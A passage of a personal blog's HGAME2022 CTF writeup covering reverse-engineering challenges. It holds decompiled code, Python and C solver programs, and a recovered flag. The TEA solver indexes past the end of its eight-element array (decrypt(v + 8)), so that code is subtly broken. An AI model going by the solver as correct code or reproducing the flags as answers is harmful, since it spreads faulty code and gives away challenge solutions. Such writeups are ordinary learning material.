<!DOCTYPE html>
<html lang="en-us">
    <head><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='主要是 RE，其他的题目会挑着记录一下'><title>HGAME2022 writeups</title>

<link rel='canonical' href='/post/hgame2022-writeups/'>

<link rel="stylesheet" href="/scss/style.min.css"><meta property='og:title' content='HGAME2022 writeups'>
<meta property='og:description' content='主要是 RE，其他的题目会挑着记录一下'>
<meta property='og:url' content='/post/hgame2022-writeups/'>
<meta property='og:site_name' content='s0uthwood&#39;s Blog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='Reverse' /><meta property='article:tag' content='Pwn' /><meta property='article:tag' content='Crypto' /><meta property='article:published_time' content='2022-02-04T13:08:32&#43;08:00'/><meta property='article:modified_time' content='2022-02-21T09:46:16&#43;08:00'/><meta property='og:image' content='/post/hgame2022-writeups/cover.png' />
<meta name="twitter:title" content="HGAME2022 writeups">
<meta name="twitter:description" content="主要是 RE，其他的题目会挑着记录一下"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='/post/hgame2022-writeups/cover.png' />
    </head>
    <body class="
    article-page has-toc
">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            if(!localStorage.getItem(colorSchemeKey)){
                localStorage.setItem(colorSchemeKey, "auto");
            }
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex 
    
        extended
    
">
    
        <div id="article-toolbar">
            <a href="/" class="back-home">
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-chevron-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <polyline points="15 6 9 12 15 18" />
</svg>



                <span>Back</span>
            </a>
        </div>
    
<main class="main full-width">
    <article class="has-image main-article">
    <header class="article-header">
        <div class="article-image">
            <a href="/post/hgame2022-writeups/">
                <img src="/post/hgame2022-writeups/cover_hu135499abd96f0998ee1b80004657897f_2075706_800x0_resize_box_3.png"
                        srcset="/post/hgame2022-writeups/cover_hu135499abd96f0998ee1b80004657897f_2075706_800x0_resize_box_3.png 800w, /post/hgame2022-writeups/cover_hu135499abd96f0998ee1b80004657897f_2075706_1600x0_resize_box_3.png 1600w"
                        width="800" 
                        height="341" 
                        loading="lazy"
                        alt="Featured image of post HGAME2022 writeups" />
                
            </a>
        </div>
    

    <div class="article-details">
    
    <header class="article-category">
        
            <a href="/categories/ctf/" >
                CTF
            </a>
        
            <a href="/categories/writeup/" >
                Writeup
            </a>
        
    </header>
    

    <h2 class="article-title">
        <a href="/post/hgame2022-writeups/">HGAME2022 writeups</a>
    </h2>

    
    <h3 class="article-subtitle">
        主要是 RE，其他的题目会挑着记录一下
    </h3>
    

    
    <footer class="article-time">
        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
  <circle cx="18" cy="18" r="4" />
  <path d="M15 3v4" />
  <path d="M7 3v4" />
  <path d="M3 11h16" />
  <path d="M18 16.496v1.504l1 1" />
</svg>
                <time class="article-time--published">Feb 04, 2022</time>
            </div>
        

        
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-pencil" width="44" height="44" viewBox="0 0 24 24" stroke-width="1.5" stroke="#9e9e9e" fill="none" stroke-linecap="round" stroke-linejoin="round">
    <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
    <path d="M4 20h4L18.5 9.5a1.5 1.5.0 00-4-4L4 16v4"></path>
    <line x1="13.5" y1="6.5" x2="17.5" y2="10.5"></line>
</svg>
                <time class="article-words">
                    5575 words
                </time>
            </div>
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



                <time class="article-time--reading">
                    27 minute read
                </time>
            </div>
        
    </footer>
    
</div>
</header>

    <section class="article-content">
    <h2 id="week1">Week1</h2>
<h3 id="reeasyasm">[RE]easyasm</h3>
<p>题目说 asm，那就硬看汇编呗</p>
<p>循环右移 4 位，然后异或 0x17</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>cipher <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x91</span>, <span style="color:#ae81ff">0x61</span>, <span style="color:#ae81ff">0x01</span>, <span style="color:#ae81ff">0xC1</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xA0</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xD1</span>, <span style="color:#ae81ff">0x21</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0xC1</span>, <span style="color:#ae81ff">0x41</span>, <span style="color:#ae81ff">0xE2</span>, <span style="color:#ae81ff">0x50</span>, <span style="color:#ae81ff">0xE1</span>, <span style="color:#ae81ff">0xE2</span>, <span style="color:#ae81ff">0x54</span>, <span style="color:#ae81ff">0x20</span>, <span style="color:#ae81ff">0xC1</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0xE2</span>, <span style="color:#ae81ff">0x60</span>, <span style="color:#ae81ff">0x14</span>, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0xD1</span>, <span style="color:#ae81ff">0x51</span>, <span style="color:#ae81ff">0xC0</span>, <span style="color:#ae81ff">0x17</span>
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">ror</span>(x):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (x <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">|</span> (x <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xff</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> c <span style="color:#f92672">in</span> cipher:
</span></span><span style="display:flex;"><span>    print (chr(ror(c <span style="color:#f92672">^</span> <span style="color:#ae81ff">0x17</span>)), end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># hgame{welc0me_to_4sm_w0rld}</span>
</span></span></code></pre></div><h3 id="recreakme">[RE]creakme</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__cdecl</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// edx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// esi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// edi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v6; <span style="color:#75715e">// ebx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v7; <span style="color:#75715e">// esi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v8; <span style="color:#75715e">// esi
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _DWORD v10[<span style="color:#ae81ff">17</span>]; <span style="color:#75715e">// [esp+Ch] [ebp-8Ch] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _BYTE v11[<span style="color:#ae81ff">32</span>]; <span style="color:#75715e">// [esp+50h] [ebp-48h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> Arglist[<span style="color:#ae81ff">32</span>]; <span style="color:#75715e">// [esp+70h] [ebp-28h] BYREF
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v13; <span style="color:#75715e">// [esp+90h] [ebp-8h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v14; <span style="color:#75715e">// [esp+94h] [ebp-4h]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(Arglist, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(Arglist));
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sub_40103A</span>(<span style="color:#e6db74">&#34;%s&#34;</span>, (<span style="color:#66d9ef">char</span>)Arglist);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">strcpy</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)v10, <span style="color:#e6db74">&#34;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&#34;</span>);
</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  v14 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">32</span>; v14 <span style="color:#f92672">=</span> i )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    v5 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>Arglist[i];
</span></span><span style="display:flex;"><span>    v6 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>Arglist[i <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>];
</span></span><span style="display:flex;"><span>    v13 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    v7 <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      v3 <span style="color:#f92672">+=</span> <span style="color:#ae81ff">0x12345678</span>;
</span></span><span style="display:flex;"><span>      v5 <span style="color:#f92672">+=</span> v3 <span style="color:#f92672">^</span> (v3 <span style="color:#f92672">+</span> v6) <span style="color:#f92672">^</span> (v10[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">*</span> v6) <span style="color:#f92672">^</span> (v10[<span style="color:#ae81ff">3</span>] <span style="color:#f92672">+</span> (v6 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>));
</span></span><span style="display:flex;"><span>      v6 <span style="color:#f92672">+=</span> v3 <span style="color:#f92672">^</span> (v3 <span style="color:#f92672">+</span> v5) <span style="color:#f92672">^</span> (v10[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">*</span> v5) <span style="color:#f92672">^</span> (v10[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">+</span> (v5 <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">5</span>));
</span></span><span style="display:flex;"><span>      <span style="color:#f92672">--</span>v7;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> ( v7 );
</span></span><span style="display:flex;"><span>    v8 <span style="color:#f92672">=</span> v14;
</span></span><span style="display:flex;"><span>    v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>Arglist[v14] <span style="color:#f92672">=</span> v5;
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>Arglist[v8 <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> v6;
</span></span><span style="display:flex;"><span>    i <span style="color:#f92672">=</span> v8 <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_OWORD <span style="color:#f92672">*</span>)v11 <span style="color:#f92672">=</span> <span style="color:#f92672">*</span>(_OWORD <span style="color:#f92672">*</span>)dword_402180;
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_OWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>v11[<span style="color:#ae81ff">16</span>] <span style="color:#f92672">=</span> dword_402170;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( Arglist[v3] <span style="color:#f92672">==</span> v11[v3] )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">++</span>v3 <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">32</span> )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">sub_40100C</span>(<span style="color:#e6db74">&#34;right!&#34;</span>, v10[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sub_40100C</span>(<span style="color:#e6db74">&#34;wrong!&#34;</span>, v10[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>那一串字符串看似和 Base64 有关，其实加密就是 TEA</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">decrypt</span> (<span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> v, <span style="color:#66d9ef">uint32_t</span><span style="color:#f92672">*</span> k) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> delta<span style="color:#f92672">=</span><span style="color:#ae81ff">0x12345678</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> v0<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">0</span>], v1<span style="color:#f92672">=</span>v[<span style="color:#ae81ff">1</span>], sum<span style="color:#f92672">=</span>delta <span style="color:#f92672">*</span> <span style="color:#ae81ff">32</span>, i;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> k0<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">0</span>], k1<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">1</span>], k2<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">2</span>], k3<span style="color:#f92672">=</span>k[<span style="color:#ae81ff">3</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>; i<span style="color:#f92672">&lt;</span><span style="color:#ae81ff">32</span>; i<span style="color:#f92672">++</span>) {
</span></span><span style="display:flex;"><span>        v1 <span style="color:#f92672">-=</span> sum <span style="color:#f92672">^</span> ((v0<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> k0) <span style="color:#f92672">^</span> (v0 <span style="color:#f92672">+</span> sum) <span style="color:#f92672">^</span> ((v0<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> k1);
</span></span><span style="display:flex;"><span>        v0 <span style="color:#f92672">-=</span> sum <span style="color:#f92672">^</span> ((v1<span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">4</span>) <span style="color:#f92672">+</span> k2) <span style="color:#f92672">^</span> (v1 <span style="color:#f92672">+</span> sum) <span style="color:#f92672">^</span> ((v1<span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">5</span>) <span style="color:#f92672">+</span> k3);
</span></span><span style="display:flex;"><span>        sum <span style="color:#f92672">-=</span> delta;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    v[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span>v0; v[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span>v1;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">uint32_t</span> v[]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">1222194312u</span>, <span style="color:#ae81ff">51123276u</span>, <span style="color:#ae81ff">1391163586u</span>, <span style="color:#ae81ff">3986482669u</span>, <span style="color:#ae81ff">2921328102u</span>, <span style="color:#ae81ff">3126465133u</span>, <span style="color:#ae81ff">3482485930u</span>, <span style="color:#ae81ff">1709241059u</span>},k[<span style="color:#ae81ff">4</span>]<span style="color:#f92672">=</span>{<span style="color:#ae81ff">0x44434241</span>,<span style="color:#ae81ff">0x48474645</span>,<span style="color:#ae81ff">0x4c4b4a49</span>,<span style="color:#ae81ff">0x504f4e4d</span>};
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">decrypt</span>(v, k);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">decrypt</span>(v <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>, k);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">decrypt</span>(v <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>, k);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">decrypt</span>(v <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span>, k);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>, v);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h3 id="reflag-checker">[RE]Flag Checker</h3>
<p>jeb 打开</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#f92672">package</span> com.example.flagchecker<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.os.Bundle<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.support.v7.app.AppCompatActivity<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.util.Base64<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.view.View.OnClickListener<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.view.View<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.widget.Button<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.widget.EditText<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> android.widget.Toast<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.crypto.Cipher<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> javax.crypto.spec.SecretKeySpec<span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">MainActivity</span> <span style="color:#66d9ef">extends</span> AppCompatActivity <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> <span style="color:#a6e22e">encrypt</span><span style="color:#f92672">(</span>String arg4<span style="color:#f92672">,</span> String arg5<span style="color:#f92672">)</span> <span style="color:#66d9ef">throws</span> Exception <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        SecretKeySpec v0 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> SecretKeySpec<span style="color:#f92672">(</span>arg5<span style="color:#f92672">.</span><span style="color:#a6e22e">getBytes</span><span style="color:#f92672">(),</span> 0<span style="color:#f92672">,</span> arg5<span style="color:#f92672">.</span><span style="color:#a6e22e">length</span><span style="color:#f92672">(),</span> <span style="color:#e6db74">&#34;RC4&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        Cipher v5 <span style="color:#f92672">=</span> Cipher<span style="color:#f92672">.</span><span style="color:#a6e22e">getInstance</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;RC4&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        v5<span style="color:#f92672">.</span><span style="color:#a6e22e">init</span><span style="color:#f92672">(</span>1<span style="color:#f92672">,</span> v0<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> v5<span style="color:#f92672">.</span><span style="color:#a6e22e">doFinal</span><span style="color:#f92672">(</span>arg4<span style="color:#f92672">.</span><span style="color:#a6e22e">getBytes</span><span style="color:#f92672">());</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">@Override</span>  <span style="color:#75715e">// android.support.v7.app.AppCompatActivity
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">protected</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onCreate</span><span style="color:#f92672">(</span>Bundle arg2<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">super</span><span style="color:#f92672">.</span><span style="color:#a6e22e">onCreate</span><span style="color:#f92672">(</span>arg2<span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">setContentView</span><span style="color:#f92672">(</span>0x7F09001C<span style="color:#f92672">);</span>  <span style="color:#75715e">// layout:activity_main
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#f92672">((</span>Button<span style="color:#f92672">)</span><span style="color:#66d9ef">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">findViewById</span><span style="color:#f92672">(</span>0x7F070022<span style="color:#f92672">)).</span><span style="color:#a6e22e">setOnClickListener</span><span style="color:#f92672">(</span><span style="color:#66d9ef">new</span> View<span style="color:#f92672">.</span><span style="color:#a6e22e">OnClickListener</span><span style="color:#f92672">()</span> <span style="color:#f92672">{</span>  <span style="color:#75715e">// id:button
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#a6e22e">@Override</span>  <span style="color:#75715e">// android.view.View$OnClickListener
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">onClick</span><span style="color:#f92672">(</span>View arg4<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                String v4 <span style="color:#f92672">=</span> <span style="color:#f92672">((</span>EditText<span style="color:#f92672">)</span>MainActivity<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">.</span><span style="color:#a6e22e">findViewById</span><span style="color:#f92672">(</span>0x7F070036<span style="color:#f92672">)).</span><span style="color:#a6e22e">getText</span><span style="color:#f92672">().</span><span style="color:#a6e22e">toString</span><span style="color:#f92672">();</span>  <span style="color:#75715e">// id:editTextTextPersonName
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                <span style="color:#66d9ef">byte</span><span style="color:#f92672">[]</span> v2 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#66d9ef">byte</span><span style="color:#f92672">[</span>0<span style="color:#f92672">];</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">try</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                    v2 <span style="color:#f92672">=</span> MainActivity<span style="color:#f92672">.</span><span style="color:#a6e22e">encrypt</span><span style="color:#f92672">(</span>v4<span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;carol&#34;</span><span style="color:#f92672">);</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">catch</span><span style="color:#f92672">(</span>Exception v4_1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                    v4_1<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>Base64<span style="color:#f92672">.</span><span style="color:#a6e22e">encodeToString</span><span style="color:#f92672">(</span>v2<span style="color:#f92672">,</span> 0<span style="color:#f92672">).</span><span style="color:#a6e22e">replace</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;\n&#34;</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">).</span><span style="color:#a6e22e">equals</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=&#34;</span><span style="color:#f92672">))</span> <span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>                    Toast<span style="color:#f92672">.</span><span style="color:#a6e22e">makeText</span><span style="color:#f92672">(</span>MainActivity<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Congratulations!!!&#34;</span><span style="color:#f92672">,</span> 1<span style="color:#f92672">).</span><span style="color:#a6e22e">show</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">return</span><span style="color:#f92672">;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>                Toast<span style="color:#f92672">.</span><span style="color:#a6e22e">makeText</span><span style="color:#f92672">(</span>MainActivity<span style="color:#f92672">.</span><span style="color:#a6e22e">this</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;Fail,try again.&#34;</span><span style="color:#f92672">,</span> 1<span style="color:#f92672">).</span><span style="color:#a6e22e">show</span><span style="color:#f92672">();</span>
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">});</span>
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">}</span>
